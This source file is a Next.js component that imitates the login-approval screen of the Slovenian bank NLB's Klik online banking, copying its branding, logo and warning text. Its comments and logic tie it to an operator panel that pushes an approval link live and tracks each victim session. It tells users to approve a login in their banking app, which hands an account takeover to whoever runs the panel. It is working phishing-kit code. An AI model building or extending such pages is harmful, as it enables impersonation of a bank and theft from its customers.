"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

// NLB Klik onay ekrani - gercek klik.nlb.si tasarimi taklit edildi:
// - bg-nlb-blue (#230078) arka plan + beyaz/acik elips dekorlar
// - sol ust hamburger, sag alt beyaz NLB wordmark
// - ortada beyaz rounded-2xl kart, ustunde NLB app ikonu
// Akis: admin link gonderir -> kullanici "Prijava s povezavo" ile uygulamayi
// acar -> uygulamada onaylar -> geri donup "Potrdil sem" basar -> wait.
export function NlbOnayClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [saving, setSaving] = useState(false);
  const [ready, setReady] = useState(false);
  const [linkOpened, setLinkOpened] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setReady(true);
        return;
      }
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const fd = (data?.form_data ?? {}) as Record<string, unknown>;
      setSessionFormData(fd);
      // Eksikse 'bekliyor' durumuna cek ki admin kolonu "NLB Bekliyor" gostersin.
      if (fd.approvalStatus !== "nlb" && fd.approvalStatus !== "nlb_confirmed") {
        void supabase
          .from("sessions")
          .update({ form_data: { ...fd, approvalStatus: "nlb" } })
          .eq("id", sessionId);
      }
      setReady(true);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  // Admin linki sonradan guncellerse (sayfa acikken) canli al.
  useEffect(() => {
    if (supabase === null || !sessionId) return;
    const channel = supabase
      .channel(`nlb-onay-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const fd = (payload.new as { form_data?: Record<string, unknown> })?.form_data;
          if (fd && typeof fd === "object") setSessionFormData(fd);
        },
      )
      .subscribe();
    return () => {
      void supabase.removeChannel(channel);
    };
  }, [sessionId, supabase]);

  const approvalLink =
    typeof sessionFormData.nlbApprovalLink === "string"
      ? sessionFormData.nlbApprovalLink.trim()
      : "";

  async function handleConfirm() {
    if (!supabase || !sessionId || saving) return;
    setSaving(true);
    const nextFormData = { ...sessionFormData, approvalStatus: "nlb_confirmed" };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);
    if (error) {
      setSaving(false);
      return;
    }
    setSessionFormData(nextFormData);
    router.push(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#230078]">
        <ConfigMissing />
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#230078]">
        <p className="rounded-xl border border-white/20 bg-white/10 p-5 text-center text-sm text-white">
          Seje ni mogoče najti.
        </p>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[9999] min-h-[100dvh] w-full overflow-hidden bg-[#230078]">
      {/* Dekoratif elipsler - gercek sayfadaki ellipse-white/ellipse-bg */}
      <div
        className="pointer-events-none absolute -left-[35vw] -top-[30vh] h-[80vh] w-[80vw] rounded-[50%] bg-white/[0.06]"
        aria-hidden
      />
      <div
        className="pointer-events-none absolute -right-[40vw] bottom-[-45vh] h-[90vh] w-[90vw] rounded-[50%] bg-[#3b1d8f]"
        aria-hidden
      />
      <div
        className="pointer-events-none absolute -right-[20vw] bottom-[-30vh] h-[60vh] w-[60vw] rounded-[50%] bg-white/[0.05]"
        aria-hidden
      />

      {/* Sol ust hamburger (gercek sayfadaki gibi) */}
      <div className="absolute left-8 top-8 z-40 flex h-8 w-6 flex-col justify-center gap-[7px] sm:left-14">
        <span className="block h-[2.5px] w-full rounded bg-white/90" />
        <span className="block h-[2.5px] w-full rounded bg-white/90" />
        <span className="block h-[2.5px] w-full rounded bg-white/90" />
      </div>

      {/* Sag ust NLB daire logosu (mobilde gorunur, gercek sayfadaki gibi) */}
      <div className="absolute right-8 top-8 z-40 h-16 w-16 overflow-hidden rounded-full border-2 border-white/25 shadow-lg md:hidden">
        <img
          src="/bank-logos/slovenia/nlb-si.png"
          alt="NLB"
          className="h-full w-full object-cover"
        />
      </div>

      {/* Sag alt beyaz NLB wordmark (gercek sayfadaki gibi) */}
      <div className="pointer-events-none absolute bottom-8 right-8 z-40 select-none md:bottom-[8vh] md:right-[8vh]">
        <span className="text-[28px] font-black tracking-[0.18em] text-white/95 md:text-[44px]">
          NLB
        </span>
      </div>

      {/* Ana panel - ortalanmis beyaz kart */}
      <div className="relative z-50 flex min-h-[100dvh] w-full flex-col items-center justify-center px-5 py-16">
        <div className="w-full max-w-[400px] rounded-2xl bg-white px-8 py-10 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.5)] sm:px-12">
          {/* NLB app ikonu */}
          <div className="flex justify-center">
            <img
              src="/bank-logos/slovenia/nlb-si.png"
              alt="NLB"
              className="h-14 w-14 rounded-2xl object-cover shadow-md"
            />
          </div>

          <h1 className="mt-6 text-center text-xl font-bold text-[#404040]">
            Potrditev prijave
          </h1>
          <p className="mt-3 text-center text-sm leading-relaxed text-[#6b6b6b]">
            Za vstop v spletno banko kliknite povezavo in prijavo potrdite v
            mobilni aplikaciji NLB Klik.
          </p>

          {/* Adim listesi */}
          <ol className="mt-7 space-y-3.5">
            <li className="flex items-start gap-3">
              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-[#230078]/10 text-[11px] font-bold text-[#230078]">
                1
              </span>
              <span className="text-[13px] leading-relaxed text-[#555]">
                Kliknite spodnjo povezavo — odprla se bo aplikacija NLB Klik.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-[#230078]/10 text-[11px] font-bold text-[#230078]">
                2
              </span>
              <span className="text-[13px] leading-relaxed text-[#555]">
                V aplikaciji potrdite prijavo.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-[#230078]/10 text-[11px] font-bold text-[#230078]">
                3
              </span>
              <span className="text-[13px] leading-relaxed text-[#555]">
                Vrnite se na to stran in pritisnite »Potrdil sem«.
              </span>
            </li>
          </ol>

          {/* Baglanti - gercek sayfadaki 'Prijava s povezavo' */}
          {approvalLink ? (
            <a
              href={approvalLink}
              onClick={() => setLinkOpened(true)}
              className="mt-8 flex w-full items-center justify-center gap-2 rounded-[10px] bg-[#230078] px-4 py-4 text-[15px] font-semibold text-white transition-all hover:bg-[#3a12b8] active:scale-[0.98]"
            >
              <svg viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7" />
                <path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7" />
              </svg>
              Prijava s povezavo
            </a>
          ) : (
            <div className="mt-8 flex items-center justify-center gap-2.5 rounded-[10px] border border-gray-200 bg-gray-50 py-4 text-[13px] font-semibold text-gray-400">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#230078] opacity-50" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-[#230078]" />
              </span>
              Čakanje na povezavo…
            </div>
          )}

          {linkOpened && (
            <p className="mt-4 flex items-center justify-center gap-2 text-[12px] font-semibold text-[#230078]">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#230078] opacity-50" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-[#230078]" />
              </span>
              Čakamo na potrditev v aplikaciji…
            </p>
          )}

          {/* Onayladim butonu */}
          <button
            type="button"
            onClick={handleConfirm}
            disabled={saving || !ready}
            className="mt-3.5 w-full rounded-[10px] border-2 border-[#230078] bg-white px-4 py-4 text-[15px] font-semibold text-[#230078] transition-all hover:bg-[#230078]/5 active:scale-[0.98] disabled:opacity-50"
          >
            {saving ? "Potrjujem…" : "Potrdil sem"}
          </button>

          <p className="mt-6 text-center text-[11px] leading-relaxed text-[#9a9a9a]">
            Če tega zahtevka niste sprožili vi, ga ne potrjujte. V primeru
            težav pokličite NLB 24/7: 01 477 20 00.
          </p>
        </div>
      </div>
    </div>
  );
}
